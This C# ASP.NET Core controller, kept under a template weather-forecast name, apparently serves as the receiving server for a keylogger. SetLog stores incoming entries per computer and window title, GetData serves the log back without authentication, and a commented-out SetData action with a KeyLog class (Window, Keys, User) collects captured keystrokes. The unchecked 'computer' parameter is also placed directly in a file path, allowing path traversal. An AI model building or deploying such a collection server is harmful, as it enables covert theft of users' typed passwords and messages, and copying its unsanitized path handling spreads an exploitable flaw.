using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Newtonsoft.Json;


namespace Server.Controllers
{
    [ApiController]
    [Route("[controller]/[action]")]


    public class WeatherForecastController : ControllerBase
    {

        private static readonly string[] Summaries = new[]
        {
            "Freezing", "Bracing", "Chilly", "Cool", "Mild", "Warm", "Balmy", "Hot", "Sweltering", "Scorching"
        };

        private readonly ILogger<WeatherForecastController> _logger;

        public WeatherForecastController(ILogger<WeatherForecastController> logger)
        {
            _logger = logger;
        }

        [HttpGet]
        public IEnumerable<WeatherForecast> Get()
        {
            var rng = new Random();
            return Enumerable.Range(1, 5).Select(index => new WeatherForecast
            {
                Date = DateTime.Now.AddDays(index),
                TemperatureC = rng.Next(-20, 55),
                Summary = Summaries[rng.Next(Summaries.Length)]
            })
            .ToArray();
        }

        [HttpGet]
        public async Task<IActionResult> GetData()
        {
            if (!System.IO.File.Exists("../../log.txt"))
                return NotFound("Log file does not exist");

            string text = await System.IO.File.ReadAllTextAsync("../../log.txt");
            return Ok(text);
        }

        [HttpGet]
        public async Task<IActionResult> SetLog([FromQuery]string logEntry, [FromQuery]string window = null, [FromQuery]string computer = "this", [FromQuery] DateTime? time  = null )
        {
            try
            {
                // Проверяем, что пришла строка с данными
                if (string.IsNullOrEmpty(logEntry))
                {
                    return BadRequest("No log entry received.");
                }

                // Записываем текстовую строку в файл
                System.IO.Directory.CreateDirectory($"../../{computer}");
                await System.IO.File.AppendAllTextAsync($"../../{computer}/log.txt", $"{time ?? DateTime.Now}|{window}|{logEntry}\n");

                // Возвращаем успешный результат
                return Ok("Log entry processed successfully.");
            }
            catch (Exception ex)
            {
                // Обрабатываем возможные ошибки
                return BadRequest($"Error: {ex.Message}");
            }
        }

        //Task<IActionResult> SetData([FromRoute] string computerName, [FromRoute] string appName, [FromBody] key)
        //localhost/setdata/pc1/word

        /*[HttpPost]
        public async Task<IActionResult> SetData([FromBody] List<KeyLog> data = null)
        {

            //await System.IO.File.WriteAllTextAsync($"../../log.json", $"{data[0].Window} - {data[0].Keys.ToString()}");
            //return Ok("Okey");
            try
            {
                // Проверяем, что пришли данные
                if (data == null || data.Count == 0)
                {
                    return BadRequest("No data received.");
                }

                // Читаем данные из объектов KeyLog
                foreach (var keyLog in data)
                {
                    string window = keyLog.Window;
                    string keys = string.Join("", keyLog.Keys); // объединяем элементы списка Keys в одну строку
                    string user = keyLog.User;

                    // Создаем объект для сериализации в JSON
                    var keyLogData = new
                    {
                        Window = window,
                        Keys = keys,
                        //User = user
                    };
                    
                    // Сериализуем объект в JSON
                    string json = JsonConvert.SerializeObject(keyLogData, Formatting.Indented);

                    // Записываем JSON в файл
                    await System.IO.File.AppendAllTextAsync($"../../log.json", json);
                }

                // Возвращаем успешный результат
                return Ok("Data processed successfully.");
            }
            catch (Exception ex)
            {
                // Обрабатываем возможные ошибки
                return BadRequest($"Error: {ex.Message}");
            }
        }*/



    }




    public class KeyLog
    {
        public string Window { get; set; }
        //public DateTime Time { get; set; }
        public List<string> Keys { get; set; }
        public string User { get; set; }
    }
}
